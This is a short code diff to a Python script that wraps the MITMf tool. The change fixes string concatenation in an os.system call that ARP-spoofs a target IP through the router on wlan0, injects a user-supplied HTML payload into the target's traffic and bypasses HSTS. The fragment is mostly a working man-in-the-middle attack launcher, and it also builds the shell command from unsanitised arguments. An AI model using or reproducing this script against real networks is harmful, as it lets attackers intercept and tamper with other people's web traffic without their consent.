@@ -9,6 +9,6 @@ def parse_args():
     parser.add_argument("-p", "--payLoad", help="Payload to inject.")
     return parser.parse_args()
 
-os.system('mitmf --spoof --arp -i wlan0 --gateway ' . routerIP . ' --target ' . victimIP . ' --inject --html-payload "' . payLoad . '" --hsts')
+os.system('mitmf --spoof --arp -i wlan0 --gateway ' + routerIP + ' --target ' + victimIP + ' --inject --html-payload \"' + payLoad + '\" --hsts')
 
 main(parse_args())
